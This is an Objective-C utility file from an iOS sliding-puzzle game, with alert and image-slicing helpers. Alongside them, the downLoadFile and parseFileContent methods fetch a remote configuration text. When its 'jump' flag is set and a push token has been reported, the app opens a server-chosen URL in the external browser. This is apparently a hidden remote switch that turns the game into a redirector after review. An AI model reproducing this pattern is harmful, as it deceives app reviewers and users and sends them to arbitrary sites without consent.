//
//  JRUtils.m
//  JRDigitalKlotski
//
//  Created by hqtech on 2018/4/26.
//  Copyright © 2018年 tulip. All rights reserved.
//

#import "JRUtils.h"

@implementation JRUtils

#pragma mark --弹框提示
+ (void)showAlertViewWithTitle:(NSString *)title
                   withMessage:(NSString *)message
               withActionTitle:(NSString *)actionTitle
              withActionMothed:(void (^)(void))actionMothed
               withCancelTitle:(NSString *)cancelTitle
              withCancelMothed:(void (^)(void))cancelMothed
            withViewController:(UIViewController *)viewController
{
    
    UIAlertController *alertCon = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    [alertCon addAction:[UIAlertAction actionWithTitle:actionTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        if (actionMothed) {
            actionMothed();
        }
    }]];
    if (cancelTitle) {
        [alertCon addAction:[UIAlertAction actionWithTitle:cancelTitle style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
            if (cancelMothed) {
                cancelMothed();
            }
        }]];
    }
    [viewController presentViewController:alertCon animated:YES completion:nil];
    
}

#pragma mark 切割图片
+ (NSArray<UIImage *> *)cutImage:(UIImage *)originalImg withRows:(NSInteger)rows withCols:(NSInteger)cols {

    // 切割后的每一个小图片的大小
    CGSize size = CGSizeMake(originalImg.size.width/cols, originalImg.size.height/rows);
    
    // 存放切割图片的数组
    NSMutableArray *imgsArr = [NSMutableArray arrayWithCapacity:0];
    
    // 切割图片
    for (NSInteger i = 0; i < rows * cols; i ++) {
        // 当前行
        NSInteger iRow = i / cols;
        // 当前列
        NSInteger iCol = i % cols;
        // 创建上下文(大小，是否透明，缩放)
        UIGraphicsBeginImageContextWithOptions(size, NO, 0);
        // 设置截图原点(由于上下文坐标系与图片自身坐标系是相反的，所以绘制坐标需要取反)
        [originalImg drawAtPoint:CGPointMake(- size.width * iCol, - size.height * iRow)];
        // 获取图片
        UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
        // 保存图片
        [imgsArr addObject:img];
    }
    
    return imgsArr;
}

#pragma mark 下载文件
// 下载文件：https://github.com/tulip09020618/JRFootballMaze/blob/master/configure.text
+ (void)downLoadFile:(void (^) (NSString *jpushAppId))block {
    
    // 先移除上报极光token记录
    [JRUserDefaultsManager removeUploadJPushTokenRecord];
    
    // 文件路径
    NSString *filePath = @"https://digitalklotski-1256547180.cos.ap-beijing.myqcloud.com/configure.txt";
    
    //1.创建会话管理者
    AFHTTPSessionManager *manager =[AFHTTPSessionManager manager];
    NSURL *url = [NSURL URLWithString:filePath];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    
    //2.下载文件
    
    /*
     第一个参数:请求对象
     第二个参数:progress 进度回调 downloadProgress
     第三个参数:destination 回调(目标位置)
     
     有返回值
     targetPath:临时文件路径
     response:响应头信息
     第四个参数:completionHandler 下载完成之后的回调
     filePath:最终的文件路径
     */
    
    __weak typeof(self) weakSelf = self;
    
    NSURLSessionDownloadTask *download = [manager downloadTaskWithRequest:request progress:^(NSProgress * _Nonnull downloadProgress) {
        NSLog(@"正在下载文件：%@", downloadProgress);
    } destination:^NSURL * _Nonnull(NSURL * _Nonnull targetPath, NSURLResponse * _Nonnull response) {
        
        NSString *fullPath = [[NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject] stringByAppendingPathComponent:response.suggestedFilename];
        
        NSLog(NSLocalizedString(@"临时文件路径：targetPath:%@", nil),targetPath);
        
        NSLog(@"fullPath:%@",fullPath);
        
        return [NSURL fileURLWithPath:fullPath];
    } completionHandler:^(NSURLResponse * _Nonnull response, NSURL * _Nullable filePath, NSError * _Nullable error) {
        
        if (error) {
            NSLog(NSLocalizedString(@"文件下载失败：%@", nil), error);
            //文件下载失败
            
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                
                // n秒后异步执行这里的代码...
                [self downLoadFile:block];
                
            });
            
        }else {
            //文件下载完成
            NSLog(NSLocalizedString(@"文件下载完成，最终的文件路径：%@", nil),filePath);
            
            // 解析文件内容
            [weakSelf parseFileContent:filePath.path withBlock:block];
        }
        
    }];
    
    //3.执行Task
    [download resume];
    
}

#pragma mark 解析文件
+ (void)parseFileContent:(NSString *)filePath withBlock:(void (^) (NSString *jpushAppId))block {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:filePath]) {
        NSLog(@"文件路径不存在");
    }
    
    // 获取文件内容
    NSData *fileContent = [NSData dataWithContentsOfFile:filePath];
    
    // 转成字符串
    NSString *content = [[NSString alloc] initWithData:fileContent encoding:NSUTF8StringEncoding];
    
    NSRange r1 = [content rangeOfString:@"{"];
    NSRange r2 = [content rangeOfString:@"}"];
    if (r1.location == NSNotFound || r2.location == NSNotFound) {
        NSLog(@"文件解析错误：文件内容格式错误；内容：%@", content);
        return;
    }
    
    if (content.length <= 2) {
        return;
    }
    
    // 是否跳转
    BOOL jump = NO;
    // 跳转时间
    CGFloat time = 3.0;
    // 跳转地址
    NSString *address = @"";
    // 极光appkey
    NSString *jpushAppKey = @"";
    
    NSString *parseStr = [content substringWithRange:NSMakeRange(r1.location + 1, r2.location - r1.location - 1)];
    NSArray *strArr = [parseStr componentsSeparatedByString:@","];
    for (NSString *itemStr in strArr) {
        if ([itemStr hasPrefix:@"jump:"]) {
            // 跳转配置
            NSRange range = [itemStr rangeOfString:@"jump:"];
            if (range.location == NSNotFound) {
                continue;
            }else if (itemStr.length > range.length) {
                jump = [[itemStr substringFromIndex:range.length] boolValue];
            }
        }else if ([itemStr hasPrefix:@"time:"]) {
            // 跳转时间配置
            NSRange range = [itemStr rangeOfString:@"time:"];
            if (range.location == NSNotFound) {
                continue;
            }else if (itemStr.length > range.length) {
                time = [[itemStr substringFromIndex:range.length] floatValue];
            }
        }else if ([itemStr hasPrefix:@"address"]) {
            // 跳转地址配置
            NSRange range = [itemStr rangeOfString:@"address:"];
            if (range.location == NSNotFound) {
                continue;
            }else if (itemStr.length > range.length) {
                address = [itemStr substringFromIndex:range.length];
            }
        }else if ([itemStr hasPrefix:@"jpushAppKey"]) {
            NSRange range = [itemStr rangeOfString:@"jpushAppKey:"];
            if (range.location == NSNotFound) {
                continue;
            }else if (itemStr.length > range.length) {
                jpushAppKey = [itemStr substringFromIndex:range.length];
            }
        }
    }
    
    if (block) {
        block(jpushAppKey);
    }
    
    // 解析完成，跳转
    [self openAddress:address jump:jump time:time];
    
    // 删除临时文件
    [fileManager removeItemAtPath:filePath error:nil];
}

#pragma mark 跳转：使用外部浏览器打开指定链接
+ (void)openAddress:(NSString *)address jump:(BOOL)jump time:(CGFloat)time {
    if (!jump) {
        // 禁止跳转
        return;
    }
    
    if (address == nil || address.length == 0) {
        // 无效地址
        return;
    }
    
    if (![[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:address]]) {
        // 不能打开链接
        return;
    }
    
    // 判断是否已上报
    if (![JRUserDefaultsManager getUploadJPushTokenRecord]) {
        // 未上报,1s后重新检查
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            
            // n秒后异步执行这里的代码...
            [self openAddress:address jump:jump time:time];
            
        });
        
        return;
    }
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(time * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        // n秒后异步执行这里的代码...
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:address]];
        
    });
}

@end
